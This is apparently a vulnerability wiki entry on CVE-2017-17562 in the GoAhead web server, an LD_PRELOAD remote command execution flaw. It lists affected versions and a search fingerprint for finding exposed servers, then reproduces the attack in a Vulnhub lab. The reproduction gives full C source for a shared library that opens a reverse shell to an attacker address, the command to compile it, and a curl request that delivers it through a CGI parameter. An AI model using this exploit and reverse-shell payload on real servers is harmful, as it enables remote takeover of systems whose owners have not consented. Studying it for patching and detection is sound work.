# Goahead LD_PRELOAD Remote Command Execution Vulnerability CVE-2017-17562

## Vulnerability Description

GoAhead supports running ASP, Javascript and standard CGI programs. This vulnerability comes from CGI programs.

This vulnerability uses the HTTP request parameter when the server initializes CGI, and uses a special parameter name LD_PRELOAD to hijack the libc library, thereby realizing remote command execution

## Vulnerability Impact

<span style="background-color:rgb(18, 160, 255); padding: 2px 4px; border-radius: 3px; color: white;">GoAhead Web Server < 3.6.5</span>

## Network surveying and mapping

<span style="background-color:rgb(18, 160, 255); padding: 2px 4px; border-radius: 3px; color: white;">app="GoAhead"</span>

## Vulnerability reappears

Use the shooting range under Vulnhub to build

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/1657072904829-9775cbdc-249f-42d1-8d8b-f7f016600500-20220706105534293.png)

Compile malicious so file

```php
#include<stdio.h>
#include<stdlib.h>
#include<sys/socket.h>
#include<netinet/in.h>

char *server_ip="";
uint32_t server_port=7777;

static void reverse_shell(void) __attribute__((constructor));
static void reverse_shell(void) 
{
  int sock = socket(AF_INET, SOCK_STREAM, 0);
  struct sockaddr_in attacker_addr = {0};
  attacker_addr.sin_family = AF_INET;
  attacker_addr.sin_port = htons(server_port);
  attacker_addr.sin_addr.s_addr = inet_addr(server_ip);
  if(connect(sock, (struct sockaddr *)&attacker_addr,sizeof(attacker_addr))!=0)
    exit(0);
  dup2(sock, 0);
  dup2(sock, 1);
  dup2(sock, 2);
  execve("/bin/bash", 0, 0);
}
gcc evil.c -fPIC -s -shared -o evil.so
```

Send evil.so malicious file

```php
curl -X POST --data-binary @evil.so https://xxx.xxx.xxx.xxx:8080/cgi-bin/index?LD_PRELOAD=/proc/self/fd/0
```

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/1657073148130-d7efbdbc-8e97-49a7-bb81-fec751d8ef47.png)

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/1657073168888-7499c581-7c81-4e43-ab46-87a35adb37b6.png)